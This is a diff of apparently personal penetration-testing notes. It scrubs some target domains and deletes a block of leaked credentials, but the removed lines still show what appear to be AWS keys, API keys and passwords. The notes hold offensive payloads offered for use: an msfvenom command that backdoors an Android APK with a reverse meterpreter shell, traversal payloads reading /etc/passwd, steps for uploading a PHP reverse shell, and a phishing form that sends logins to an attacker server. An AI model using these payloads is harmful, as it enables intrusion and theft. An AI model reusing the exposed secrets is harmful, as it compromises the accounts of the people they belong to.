@@ -1,4 +1,4 @@
-﻿Port Tunneling over Port Forwarding -- use ngrok.com or portmap.io
+Port Tunneling over Port Forwarding -- use ngrok.com or portmap.io
 msfvenom -x UC.apk -p /android/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -0 UC_1.apk
 d2j-apk-sign UC1.apk
 https://pengs.win/how-to-make-a-persistent-android-backdoor-using-metasploit/
@@ -188,7 +188,7 @@ Web applications make use of serialization and deserialization on a regular basi
 HOST HEADER INJECTION:
 https://URL?host_header=x-forwarded-host/host
 X-Forwarded-Host: google.com
-curl --verbose --header 'Host: www.example.com' 'https://www.myuhc.com/member/themes/html/portal/images/utility?host_header=host'
+curl --verbose --header 'Host: www.example.com' 'https://www.test.com/member/themes/html/portal/images/utility?host_header=host'
 
 
 XML Injection: 
@@ -271,8 +271,7 @@ https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn/
 https://0xpatrik.com/takeover-proofs/  --better post
 https://blog.securitybreached.org/2018/09/24/subdomain-takeover-via-unsecured-s3-bucket/
 https://www.we45.com/blog/how-an-unclaimed-aws-s3-bucket-escalates-to-subdomain-takeover
-Accesskey ID: AKIAZG4KGXFUPPMRIMJZ
-secret access key: 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
+
 
 
 
@@ -365,6 +364,7 @@ Cookie Values Used in Anti-CSRF Token
 _ViewState MAC Disabled         -->           http://blog.ptsecurity.com/2012/01/viewstate-vulnerabilities.html
 .net enabled servers locate trace.axd files (High severity)
 
+
 httpd.conf
 apache.conf  
 .htaccess
@@ -391,6 +391,7 @@ vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 file://../etc/passwd
 /..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts -- double URL encode
 
+
 1. Create a PHP reverse shell
 2. Compress to a .zip file
 3. Upload the compressed shell payload to the server
@@ -402,7 +403,7 @@ file://../etc/passwd
 HTML Template Injection: 
 http://127.0.0.1/vulnerable.php?name=<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" action="http://attackerserver/login.php">Username: <input type="text" name="username"/><br/>Password: <input type="password" name="password" /><br /><input type="submit" value="Login" /></form><!--
 
-HTML injection :   <iframe src="https://www.provensec.com" width="500" height="500"></iframe>
+HTML injection :   <iframe src="https://www.example.com" width="500" height="500"></iframe>
 
 
 
@@ -435,28 +436,7 @@ Mail Spoofing
 	https://emkei.cz/
 
 
-	
 
-username:  hashmax
-gmail1:		mailto2340@gmail.com
-gmail2:		mailto2342@gmail.com
-Password;  Hasher@123 / M0#17verma
-
-
-maltego: insert.passkey@gmail.com/mv3waxEz
-shodan api key:  YeBRyXdz3AcznYgPe5SCy4K94fQBmlKG  
-virustotal api key: 2fa31cfb8a53c66bbadd8d9ddf3901639efe4ebd884175bcf82f789d4162d04f
-
-
-noip  
-mail:    hutikiceh@air2token.com
-pass :1234567890
-username: testerup123
-
-
-genymotion:
-username: mailto2342@gmail.com
-pass: mv@12345
 
 
 SPF (Sender Policy Framework) is a DNS text entry which shows a list of servers that should be considered allowed to send mail for a specific domain. Incidentally the fact that SPF is a DNS entry can also considered a way to enforce the fact that the list is authoritative for the domain, since the owners/administrators are the only people allowed to add/change that main domain zone.
@@ -530,7 +510,7 @@ Description:
 1. Navigate to http://sec.us/?'*prompt()*'whscheck
 2. Go into your browser’s Developer Tools and open your Web Console
 3. Execute the following command:
-document.write(“<a/href=\”https://xyz.uhc.com/”>click</a>”);
+document.write(“<a/href=\”https://xyz.com/”>click</a>”);
 4. Click on newly created link
 5. Authenticate to applicaton
 6. Observe JavaScript popup
